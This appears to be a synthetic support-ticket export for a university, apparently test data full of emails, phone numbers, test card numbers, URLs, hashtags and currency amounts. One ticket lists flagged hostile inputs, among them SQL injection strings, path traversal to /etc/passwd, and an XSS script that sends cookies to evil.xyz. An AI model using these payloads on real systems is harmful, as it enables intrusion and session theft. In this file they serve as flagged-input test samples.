@@ -1,0 +1,198 @@
+================================================================================
+SUPPORT TICKET EXPORT — CUSTOMER OPERATIONS PLATFORM
+Generated: 2024-11-14T08:32:01Z | Region: Africa & Middle East | Batch ID: CMX-20241114
+================================================================================
+
+--- TICKET #10042 | Priority: HIGH | Status: OPEN ---
+Submitted by: Amara Diallo <amara.diallo@gmail.com>
+Assigned to: support-lead@alueducation.com
+CC: billing@alueducation.com, noreply@alumni.alueducation.com
+
+Hi team,
+
+I've been trying to complete my registration payment since yesterday. The system keeps rejecting my card ending in 4111 1111 1111 1111 (Visa). I also tried my backup card 5500-0000-0000-0004 but same issue. My transaction reference was TXN-998821.
+
+The total amount due was $1,250.00 and I was also charged an unexpected fee of $45.99 that I didn't authorize. Can someone look into this?
+
+You can reach me on +250 788 123 456 or via WhatsApp on +1 (415) 555-0192.
+
+Thanks,
+Amara
+
+---
+
+--- TICKET #10043 | Priority: MEDIUM | Status: RESOLVED ---
+From: kwame.mensah+support@protonmail.com
+To: helpdesk@si.alueducation.com
+
+Hello,
+
+Following up on my earlier request regarding the invoice for ₦85,000.00 (approximately $52.30 at today's rate). The payment was split across two transactions — ₦50,000.00 on the 3rd and ₦35,000.00 on the 9th.
+
+Please also update my contact number. Old number: 078-456-7890. New number: +254 712 345 678.
+
+My student portal is showing an error on this page: https://portal.alueducation.com/students/dashboard?id=KM2024&tab=billing
+
+For reference, the announcement was posted at https://www.alueducation.com/announcements/2024/fees-update
+
+Regards,
+Kwame Mensah | ALU Rwanda, Cohort 4
+
+---
+
+--- TICKET #10044 | Priority: LOW | Status: OPEN ---
+From: fatima_noor91@yahoo.com
+Assigned: onboarding@alueducation.com
+
+Hi,
+
+I saw the post on Instagram — #ALUAdmissions #ScholarshipAlert — and wanted to ask about the scholarship. The post said applications are open until Dec 15. My friend tagged me in #ALUKigali #StudyInAfrica and I figured I'd reach out directly.
+
+My budget for the program is around $3,000 - $5,000 per semester depending on financial aid. Is there any support for students coming from outside Rwanda?
+
+You can call me at 0712-998-876 or email me back here.
+
+Thanks!
+Fatima
+
+---
+
+--- TICKET #10045 | Priority: CRITICAL | Status: ESCALATED ---
+From: tech.ops@alueducation.com
+To: infrastructure@si.alueducation.com, backup-admin@alumni.alueducation.com
+
+Team,
+
+We detected suspicious activity on the payment processor at 14:32 UTC. The following inputs were submitted through the public contact form and should be treated as hostile:
+
+  [FLAGGED INPUT 1]: user@domain.com' OR '1'='1
+  [FLAGGED INPUT 2]: <script>document.location='http://evil.xyz/steal?c='+document.cookie</script>
+  [FLAGGED INPUT 3]: ../../../../etc/passwd
+  [FLAGGED INPUT 4]: admin@alueducation.com%00@evil.com (null byte injection attempt)
+  [FLAGGED INPUT 5]: SELECT * FROM users WHERE email='' OR 1=1--
+  [FLAGGED INPUT 6]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@overflow.com (buffer overflow attempt via excessive length)
+  [FLAGGED INPUT 7]: 4111 1111 1111 1111<img src=x onerror=alert(1)> (XSS embedded in card field)
+  [FLAGGED INPUT 8]: +1 (000) 000-0000 (known invalid/test number format)
+
+All flagged entries were logged and blocked. No customer data was accessed.
+
+Incident report filed at: https://internal.alueducation.com/incidents/2024/INV-00441?auth=required
+
+Action required by: 17:00 UTC today.
+
+— Ops Team
+
+---
+
+--- TICKET #10046 | Priority: MEDIUM | Status: OPEN ---
+From: chidi.okafor@outlook.com
+To: admissions@alueducation.com
+
+Dear Admissions,
+
+I'd like to know the cost breakdown for the BSE program. I've seen figures like $12,000/year and also £8,500 mentioned in different places online, which is confusing.
+
+My current phone (Nigeria): +234 803 456 7890
+My alternate (UK): +44 7911 123456
+
+I found the program through this article: https://techcabal.com/2024/10/alu-bse-program-review/ and also a Reddit thread at https://www.reddit.com/r/Africa/comments/xyz123/alu_review
+
+Social posts I saw: #TechInAfrica #ALUNigeria #BuildingAfrica
+
+Just to confirm — my email going forward will be chidi.okafor@alumni.alueducation.com once I enroll, correct?
+
+Best,
+Chidi Okafor
+
+---
+
+--- TICKET #10047 | Priority: LOW | Status: CLOSED ---
+From: rosa.maulidi@students.alueducation.com
+To: finance@alueducation.com
+
+Hi Finance,
+
+Attaching the breakdown for our club event expenditure:
+
+  - Venue hire: KES 15,000.00
+  - Catering (per head $8.50 x 40 students): $340.00
+  - Printed materials: ₦12,500.00
+  - Miscellaneous: $22.75
+
+Total approximate (USD): $415.00
+
+Club Instagram: https://www.instagram.com/p/C9xKlMnOpQ7/
+Hashtags used in posts: #ALUClubLife #KigaliEvents #PanAfrica2024
+
+Payment should go to account linked to this card: 3714 496353 98431 (AmEx). Please confirm receipt.
+
+My number if needed: (078) 312-4456
+
+Thanks,
+Rosa
+
+---
+
+--- TICKET #10048 | Priority: HIGH | Status: OPEN ---
+From: ???@???.??? (malformed sender — flagged by mail server)
+To: admin@alueducation.com
+
+[AUTOMATED SPAM FILTER NOTE: Message blocked. Sender address failed DNS validation.]
+
+Message body excerpt (logged for review):
+"Click here now!!! visit http://totally-legit-prizes.biz/win?ref=ALU&token=xXx123 to claim your $10,000 reward!!!
+Contact: 00000000000 or write to winner@scam.biz
+Use code #FreeMoneyNow to get ₦500,000 instantly!!"
+
+Card number submitted in body: 1234 5678 9012 3456 (Luhn check: FAIL)
+
+---
+
+--- TICKET #10049 | Priority: MEDIUM | Status: OPEN ---
+From: leila.hassan@si.alueducation.com
+To: peer-support@alueducation.com
+
+Hey,
+
+Quick note — I'll be running the study session this week. We're using the shared doc at https://docs.google.com/document/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgVE2upms/edit
+
+Time: 6:00 PM - 8:30 PM (EAT) — or for those in the UK joining remotely, that's 4:00 PM - 6:30 PM
+
+Please share with anyone using #StudyWithALU or #ALURwanda on your stories.
+
+My number for the group chat: +250 722 876 543
+
+See you all there!
+Leila
+
+---
+
+--- TICKET #10050 | Priority: LOW | Status: CLOSED ---
+System-generated notification to: batch-notify@alueducation.com
+
+The following accounts had incomplete profile data as of 2024-11-13:
+
+  ID: STU-0041 | Email: missing | Phone: +250 788 000 111
+  ID: STU-0042 | Email: broken@@alueducation.com | Phone: 07-INVALID
+  ID: STU-0043 | Email: validstudent@alueducation.com | Phone: (not provided)
+  ID: STU-0044 | Email: another.student@alumni.alueducation.com | Phone: +1-800-555-0199
+  ID: STU-0045 | Email: @nodomain.com | Phone: +44 20 7946 0958
+  ID: STU-0046 | Email: no-at-sign.alueducation.com | Phone: 0788123456
+  ID: STU-0047 | Email: double..dots@alueducation.com | Phone: +250 788 999 000
+
+Accounts with malformed emails have been quarantined pending manual review.
+Accounts with missing phone numbers have been flagged for follow-up.
+
+---
+
+PLATFORM FOOTER
+Support portal: https://support.alueducation.com
+Emergency line: +250 780 000 000
+Finance queries: finance@alueducation.com | billing@alueducation.com
+Social: #ALUEducation #LeadingWithPurpose #AfricanLeadership
+Operating hours: Mon-Fri, 08:00 - 18:00 (EAT) | Sat, 09:00 - 13:00
+All transactions processed in USD. Local currency equivalents shown for reference only.
+Amounts shown: $1,250.00 | $45.99 | ₦85,000.00 | KES 15,000.00 | £8,500.00 | $12,000.00
+================================================================================
+END OF EXPORT BATCH CMX-20241114
+================================================================================
